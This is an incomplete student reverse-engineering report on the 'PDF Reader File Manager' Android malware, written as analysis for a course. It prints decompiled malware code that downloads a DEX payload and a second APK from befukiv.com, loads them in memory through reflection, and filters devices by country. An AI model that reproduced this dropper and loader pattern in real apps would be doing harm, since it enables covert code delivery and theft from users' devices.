---
geometry: margin=25mm
title: RE - PDF Manager
author: Tiago Silvestre - 103554, David Araújo - 93444
date: March 8, 2024
---

# Table of Contents
1. [Introduction](#introduction)
2. [Environment and Tools](#environment-and-tools)
3. [Exploration Steps](#exploration-steps)
4. [Conclusions](#conclusions) 

# Introduction

For our reverse engineering course, we have decided to analyze and reverse engineer the "PDF Reader File Manager" application, which was known for being removed from the Play Store earlier this year. It was developed to steal data from Android users, as explained in this article [here](https://www.tomsguide.com/computing/malware-adware/these-malicious-android-malware-apps-were-downloaded-150000-times-from-the-play-store-delete-them-right-now).

# Environment and Tools

## Environment
To explore this application, we first focused on using a **secure environment** where we could ensure that the finding **wouldn't harm** the host system, and prevent the **system from tainting** any of the possible findings.

We used Vagrant to set up a [Kali box](https://app.vagrantup.com/kalilinux/boxes/rolling) where we could import the provided raw files for evaluation. Also [REMnux Docker container](https://docs.remnux.org/install-distro/remnux-as-a-container) was used for further forensic exploration.

## Tools

[TODO]

# Exploration Steps & Findings

## Unpack

Unziping the file with `7za PDF_Reader_File_Manager.zip` results in the files and directory shown below.

![From the zip archive](./imgs/Screenshot%20from%202024-03-08%2017-30-10.png)

With a little investigation, we can discover that XAPK files are just a bundle of APKs with other files. To retrieve these we can again use `7za` and run it with the XAPK file. E now have multiple APKs, a PNG and a JSON file.

![Extracted files](./imgs/Screenshot%20from%202024-03-05%2000-41-49.png)

When trying to run `apktool d 1.apk` or `jadx -d out 1.apk`, we are confronted with some error. This does not happen with any other APK, so inspecting the file signatures, we can find that **1.apk is not a clean APK** file.

![APK files signatures](./imgs/Screenshot%20from%202024-03-08%2017-40-55.png)

Indeed, if we try to unzip the file, we can retrieve multiple files.

![Inside the 1.apk](./imgs/Screenshot%20from%202024-03-08%2017-45-52.png)

## Decompiling

We now have a large set of files from the application, however, many of them are not relevant to what we are trying to achieve and can blur our view over the whole of the application.

From all of the APKs found, the first focus on the _com.tragisoap.fileandpdfmanager.apk_ has it probably is the main application, and if anything malicious is to happen, it should first come from here.

Using `apktool`, we can expose the inner contents of the bundle. To do this we can use the following command:

```bash
apktool d -r -s com.tragisoap.fileandpdfmanager.apk
```

From this, the most important file is the _classes.dex_ file, from which we can reassemble the Java class files. To do this we can use `jadx` with the command:

```bash
jadx -d out classes.dex
```

## Walkthrough

```mermaid
flowchart TD
    A([PreviewActivity]) --> B([FileManagerService])
    F -- No --> C([Malicius.fetchFilesAndProcess])
    C --> D([mapMuchasPuchasToMethods])
    D --> E([travisscot.init])
    E --> B
    B --> F{traviscot initialized ?}
    F -- Yes ---> G([traviscot.makePdfPage])
    G --- H[set 1.apk url]
    G --> I([PartPreviewActivity.onNewIntent])
    I --> J([PartPreviewActivity.onCreate])
```

We start our analysis in the _com.tragisoap.fileandpdfmanager.MainActivity_ class has it is the applications start point. From this class we can only see that there are a few listeners for clicking which is to be expected in a mobile application.

We can reconstruct the malicious flow, starting from the _PreviewActivity_ class, which in turn gets a variable from _FileManagerService_ that appears to be a counter of some kind ... TO COMPLETE

```java
public static void fetchFilesAndProcess() {
    String str;
    Session session = new Session();
    HttpHandler.getRequest getrequest = new HttpHandler.getRequest();
    getrequest.request("https://befukiv.com/muchaspuchas");
    HttpHandler call = getrequest.call();
    HttpHandler.getRequest getrequest2 = new HttpHandler.getRequest();
    getrequest2.request("https://befukiv.com/cortina");
    HttpHandler call2 = getrequest2.call();
    try {
        ParseHttpResponseBody parseHttpResponseBody = new setupTls(session, call).Execute().responseBody;
        byte[] parse = parseHttpResponseBody.parse();
        TwoStrings twoStrings = parseHttpResponseBody.getTwoStrings();
        Charset charset = z4.h.utf8Charset;
        if (twoStrings != null && (str = twoStrings.secondStr) != null) {
            charset = Charset.forName(str);
        }
        muchasStrings.set(new String(parse, charset.name()).split("\\|"));
        byte[] parse2 = new setupTls(session, call2).Execute().responseBody.parse();
        if (fetchAndProcessCompleted.get()) {
            return;
        }
        fw.getClass();
        WriterFile.mapMuchasPuchasToMethods(parse2);
        fetchAndProcessCompleted.set(true);
    } catch (Throwable th) {
        th.printStackTrace();
    }
}
```

Although it's obfuscated, we can see that it's accessing files from the domain **befukiv.com**. A DNS search reveals that this domain has two name servers pointing to domains in Russia.

```
...
Registrant Email: http://whois.nicenic.net/?page=whoisform
Admin Email: http://whois.nicenic.net/?page=whoisform&emailtype=admin
Tech Email: http://whois.nicenic.net/?page=whoisform&emailtype=tech
Name Server: NS1.ERANS.RU
Name Server: NS2.ERANS.RU
DNSSEC: unsigned
...
```

At the time this report is being written, the server is accessible, but the resources are not available (it returns a 'not found' response).

But we have access to these files as they were previously downloaded, so it's possible to continue our analysis.

### Exploring 'muchaspuchas'

The **'muchaspuchas'** file is composed of what seems to be Java method or class names separated by the | character. The function where this file is being downloaded splits the file contents by the | character.

```
dalvik.system.InMemoryDexClassLoader|getClassLoader|loadClass|com.travisscott.pdf.MainLibrary|...
```

This shows that the authors maybe wanted to obfuscate application method calls with reflection. To confirm this assumption we decided to analyze `mapMuchasStringsToMethods` function and deofuscated it in the following way.

```java
    public static void mapMuchasPuchasToMethods(byte[] bArr) {
        Class inMemoryDexClassLoader = (Class) getClassInstanceByMethodName(Malicious.muchasStrings.get()[0]); // dalvik.system.InMemoryDexClassLoader
        Class cls = (Class) inMemoryDexClassLoader.getMethod(Malicious.muchasStrings.get()[2], String.class).invoke(inMemoryDexClassLoader.getConstructor((Class) getClassInstanceByMethodName(Malicious.muchasStrings.get()[11]), (Class) getClassInstanceByMethodName(Malicious.muchasStrings.get()[12])).newInstance(ByteBuffer.wrap(bArr), Class.class.getMethod(Malicious.muchasStrings.get()[1], new Class[0]).invoke(Malicious.class, new Object[0])), Malicious.muchasStrings.get()[3]);
        Malicious.makePdfPage = getClassMethod(cls, Malicious.muchasStrings.get()[10], Context.class);
        Malicious.readPdfFile = getClassMethod(cls, Malicious.muchasStrings.get()[7], Context.class);
        Malicious.getFirstText = getClassMethod(cls, Malicious.muchasStrings.get()[5], new Class[0]);
        Malicious.getSecondText = getClassMethod(cls, Malicious.muchasStrings.get()[6], new Class[0]);
        Method init = getClassMethod(cls, Malicious.muchasStrings.get()[4], Class.class, Class.class);
        Malicious.launch = getClassMethod(cls, Malicious.muchasStrings.get()[9], Context.class);
        Malicious.getName = getClassMethod(cls, Malicious.muchasStrings.get()[8], Context.class);
        init.invoke(null, PartPreviewActivity.class, MainActivity.class);
    }
```

From that, we can see that the function is using java reflection to dynamically assign variables of Malicious class based on methods/classes names obtained from muchaspuchas file.

The _mapMuchasStringsToMethods_ method receives as an argument a byte array containing data from _cortina_ file. It seems that it's loading a class based on the binary file. Based on that we decided to analyze as a next step, to analyze the _cortina_ file.

### Exploring 'cortina'
TODO - Explain: 
1. Cortina is a DEX file with the package _travisscot_, we can confirm this by running `$ file cortina`
2. Open _cortina.dex_ in JADX.
3. _travisscot_ is invoked at the end of the _mapMuchasPuchasToMethods_ method.
4. _travisscot_ functions as a library that extends the main file with functionalities.

```java
public class FileManagerService extends f {

    /* renamed from: j */
    public static final /* synthetic */ int f3513j = 0;

    @Override // f1.f
    public final void a() {
        try {
            Malicious.fetchFilesAndProcess();
            try {
                Malicious.makePdfPage.invoke(null, this);
            } catch (IllegalAccessException | InvocationTargetException e) {
                e.printStackTrace();
            }
        } catch (Throwable th) {
            th.printStackTrace();
            Intent intent = new Intent(this, MainActivity.class);
            intent.addFlags(268435456);
            startActivity(intent);
        }
    }
}
```

All that we have seen so far as happened when the _Malicious.fetchFilesAndProcess_ was called which then resulted in a an additional set of functions to be loaded. One of this function, _makePdfPage_ is called after the package is loaded.

```java
public static void makePdfPage(Context context) {
    ServiceHandler.handleWork(context);
}
```

It then calls yet another function, also from the _travisscot_ package which is shown bellow.

```java
public static void handleWork(Context context) {
    if (Build.MODEL != null && !Build.MODEL.isEmpty() && Build.MANUFACTURER != null
            && !Build.MANUFACTURER.isEmpty()) {
        TelephonyManager tm = (TelephonyManager) context.getSystemService("phone");
        String country = tm.getNetworkCountryIso().isEmpty() ? "uat" : tm.getNetworkCountryIso();
        if (isManuFacturerGood() && !checkBuildConfig()) {
            if (!country.startsWith("es") && !country.startsWith("sk") && !country.startsWith("cz")
                    && !country.startsWith("ru") && !country.startsWith("hr") && !country.startsWith("si")
                    && !country.startsWith("sl") && !country.startsWith("bg") && !country.startsWith("ee")
                    && !country.startsWith("fi") && !country.startsWith("ie") && !country.startsWith("gb")) {
                Intent i = new Intent(context, MainLibrary.getMainActivity());
                i.addFlags(268435456);
                context.startActivity(i);
                return;
            }
            try {
                MainLibrary.url.set("https://befukiv.com/1.apk");
                Intent i2 = new Intent(context, MainLibrary.getPartPreviewActivity());
                i2.addFlags(268435456);
                context.startActivity(i2);
            } catch (Exception e) {
                e.printStackTrace();
                Intent i3 = new Intent(context, MainLibrary.getMainActivity());
                i3.addFlags(268435456);
                context.startActivity(i3);
            }
        }
    }
}
```

This method will check in which country the current device is operating and stop execution for a selected list of countries. We don't know why it does this, one guess could be that the domain from where it is trying to download the fil, _1.apk_ is blocked in those country. If it not in one of those country, it stores the url in has an attribute of the _MainActivity_ class.

After doing this, it creates a new _Intent_ object and starts the activity of the _PartPreviewActiviy_ class.

```java
public final void onCreate(Bundle bundle) {
    String str;
    String str2 = "tura dar";
    super.onCreate(bundle);
    s().t(1);
    getWindow().setStatusBarColor(0);
    setContentView(2131492981);
    TextView textView = (TextView) findViewById(2131296755);
    try {                                                               // First try
        m.f3835d.invoke(null, this);                
    } catch (IllegalAccessException | InvocationTargetException e) {
        e.printStackTrace();
    }
    Button button = (Button) findViewById(2131296492);
    try {                                                               // Second try
        str = (String) m.f3833b.invoke(null, new Object[0]);
    } catch (IllegalAccessException | InvocationTargetException e7) {
        e7.printStackTrace();
        str = "tura dar";
    }
    textView.setText(str);
    try {                                                               // Third try
        str2 = (String) m.f3834c.invoke(null, new Object[0]);
    } catch (IllegalAccessException | InvocationTargetException e8) {
        e8.printStackTrace();
    }
    button.setText(str2);
    button.setOnClickListener(new q(4, this));
}

@Override // androidx.fragment.app.q, androidx.activity.ComponentActivity, android.app.Activity
public final void onNewIntent(Intent intent) {
    super.onNewIntent(intent);
    Bundle extras = intent.getExtras();
    if ("com.tragisoap.fileexplorerpdfviewer.SESSION_API_PACKAGE_INSTALLED".equals(intent.getAction()) && extras.getInt("android.content.pm.extra.STATUS") == -1) {
        startActivity((Intent) extras.get("android.intent.extra.INTENT"));
    }
}

@Override // androidx.fragment.app.q, android.app.Activity
public final void onResume() {
    super.onResume();
    try {
        Malicious.getName.invoke(null, this);
    } catch (IllegalAccessException | InvocationTargetException e) {
        e.printStackTrace();
    }
}
```

TODO: continue to follow the flow


Going through the _1.apk_ files, we encountered a package named "juw.khdqwmf.xftkgphgq.fhyu" containing Chinese characters. After translating these strings using Google Translate, we determined that these characters formed simple Chinese sentences unrelated to the application's purpose. Further exploration revealed that **these strings were translated into package names when passed through a function**. This indicates that the original authors chose to obscure package names using Chinese strings.
